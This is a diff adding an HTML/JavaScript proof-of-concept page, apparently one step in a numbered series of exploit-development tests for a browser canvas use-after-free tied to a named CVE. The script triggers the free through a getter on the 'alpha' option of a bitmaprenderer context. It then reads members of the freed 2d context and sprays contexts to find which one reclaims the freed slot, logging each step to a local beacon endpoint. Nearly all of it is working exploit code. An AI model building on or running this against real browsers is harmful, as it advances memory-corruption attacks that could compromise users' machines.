@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V684 non-Vector members</title></head>
+<body><pre id="out">V684 — read the freed context without touching m_stateStack</pre>
+<script>
+/* V684: V683 showed every state() read (lineWidth & co.) dies after the
+ * CVE-2026-43720 trigger, while a same-type reclaim works.  Dead-ends doc
+ * says the modern ~Vector calls resetBufferAndCapacity(), i.e. m_buffer is
+ * NULLED at free time -> state() = *(State*)0 -> SIGSEGV.  So the Vector is
+ * poisoned *by the destructor*, not by the allocator.
+ *
+ * V684 therefore reads members that do NOT go through m_stateStack:
+ *   m_canvas            via  savedCtx.canvas
+ *   m_settings          via  savedCtx.getContextAttributes()
+ *   m_unrealizedSaveCount via save()/restore()
+ * and maps which sprayed 2d context wins the freed slot.
+ *
+ * Modes (one per page load):
+ *   op=probe   save -> getContextAttributes -> canvas identity -> restore
+ *   op=whoami  reclaim with N 2d ctxs, report which one aliases savedCtx
+ *   op=reset   clear once-guards
+ *
+ * Every step is followed by its own SYNCHRONOUS beacon, so the log shows
+ * exactly how far execution got before a fault.
+ * Params: op, n (ctx count, default 24), once=1, reset=1
+ */
+'use strict';
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'probe';
+var CTXN = parseInt(PARAM.n || '24', 10) || 24;
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+
+function bk(tag, body) {
+  var u = '/beacon/V684-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+}
+/* synchronous: the log entry exists before the next line runs */
+function bks(tag, body) {
+  var u = '/beacon/V684-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+var f64 = new Float64Array(1), u32 = new Uint32Array(f64.buffer);
+function d2hex(d) {
+  if (typeof d !== 'number') return String(d);
+  f64[0] = d;
+  return '0x' + ('00000000' + u32[1].toString(16)).slice(-8) + ('00000000' + u32[0].toString(16)).slice(-8);
+}
+
+function clearOnce() {
+  var n = 0, pref = ['v683c_', 'v684c_'];
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      for (var p = 0; p < pref.length; p++) {
+        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
+      }
+    }
+  } catch (e) {}
+  return n;
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('v683/v684 guards cleared. Reload the index.');
+}
+if (MODE !== 'reset') {
+  var onceKey = 'v684c_' + MODE + '_n' + CTXN;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');   /* advance BEFORE the risky read */
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'op=' + MODE);
+    say('BLOCKED by once=1 for op=' + MODE + ' (tap RESET)');
+  } else {
+    var lateFired = false;
+    setTimeout(function () {
+      lateFired = true;
+      bk('OLATE', 'op=' + MODE + ',alive=1');
+    }, 1500);
+
+    bks('OBOOT', 'op=' + MODE + ',n=' + CTXN + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v684canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');      /* default settings: alpha=true */
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v684ctx = ctx;                  /* keep the wrapper alive */
+        try {
+          ctx.lineWidth = 3.14159;
+          ctx.miterLimit = 7.77;
+          ctx.globalAlpha = 0.42;
+        } catch (eI) {}
+        return true;
+      }
+    });
+
+    bks('OPRE', 'op=' + MODE);                  /* context still alive */
+
+    var bmpCtx = null, terr = '';
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); }
+    catch (eJ) { terr = eJ.name || 'err'; }
+
+    if (!savedCtx) {
+      bks('OFAIL', 'op=' + MODE + ',no-inner');
+      say('ABORT: inner context missing');
+    } else if (!bmpCtx) {
+      bks('OFAIL', 'op=' + MODE + ',no-bmr:' + terr);
+      say('ABORT: bitmaprenderer failed ' + terr);
+    } else if (MODE === 'probe') {
+      /* ---- step 1: plain member write (m_unrealizedSaveCount) ---- */
+      var s1 = 'ok';
+      try { savedCtx.save(); } catch (e1) { s1 = 'E!' + (e1.name || 'err'); }
+      bks('OSTEP1', 'op=probe,save=' + s1);
+      say('save -> ' + s1);
+
+      /* ---- step 2: pure byte read of m_settings (no pointer deref) ---- */
+      var s2 = '', at = null;
+      try {
+        at = savedCtx.getContextAttributes();
+        s2 = 'alpha=' + (at && at.alpha) + ',wrf=' + (at && at.willReadFrequently) +
+             ',desync=' + (at && at.desynchronized) + ',cs=' + (at && at.colorSpace);
+      } catch (e2) { s2 = 'E!' + (e2.name || 'err'); }
+      bks('OSTEP2', 'op=probe,attr=' + s2);
+      say('attrs -> ' + s2);
+
+      /* ---- step 3: pointer load of m_canvas ---- */
+      var s3 = '', same = null;
+      try {
+        same = (savedCtx.canvas === canvas) ? 1 : 0;
+        s3 = 'self=' + same + ',w=' + savedCtx.canvas.width + ',h=' + savedCtx.canvas.height;
+      } catch (e3) { s3 = 'E!' + (e3.name || 'err'); }
+      bks('OSTEP3', 'op=probe,canvas=' + s3);
+      say('canvas -> ' + s3);
+
+      /* ---- step 4: undo the counter ---- */
+      var s4 = 'ok';
+      try { savedCtx.restore(); } catch (e4) { s4 = 'E!' + (e4.name || 'err'); }
+      bks('OSTEP4', 'op=probe,restore=' + s4);
+      say('restore -> ' + s4);
+
+    } else if (MODE === 'whoami') {
+      /* reclaim the freed slot, then identify the winner by identity */
+      var ckeep = new Array(CTXN), cmade = 0;
+      for (var c = 0; c < CTXN; c++) {
+        var cc = document.createElement('canvas');
+        cc.width = 1; cc.height = 1;
+        var cx = null;
+        try { cx = cc.getContext('2d'); } catch (eT) {}
+        if (cx) {
+          try { cx.lineWidth = 200 + cmade; } catch (eU) {}
+          ckeep[cmade] = cc;
+          cmade++;
+        }
+      }
+      window._v684keep = ckeep;
+      var hit = -1, wr = -1, lw = null, err = '';
+      try {
+        for (var k = 0; k < cmade; k++) {
+          if (savedCtx.canvas === ckeep[k]) { hit = k; break; }
+        }
+        if (hit >= 0) {
+          lw = savedCtx.lineWidth;
+          try { if (ckeep[hit].getContext('2d') === savedCtx) wr = 1; else wr = 0; } catch (eW) { wr = 2; }
+        }
+        bks('OSTEP', 'op=whoami,made=' + cmade + ',hit=' + hit +
+            ',lw=' + (lw === null ? 'na' : d2hex(lw)) + ',sameWrap=' + wr);
+        say('made=' + cmade + ' hit=' + hit + ' lw=' + (lw === null ? 'na' : d2hex(lw)) + ' sameWrap=' + wr);
+      } catch (eV) {
+        err = eV.name || 'err';
+        bks('OSTEP', 'op=whoami,made=' + cmade + ',E!' + err);
+        say('whoami THROW ' + err);
+      }
+
+    } else {
+      bks('OFAIL', 'unknown-op=' + MODE);
+      say('unknown op ' + MODE);
+    }
+  }
+}
+</script>
+</body></html>
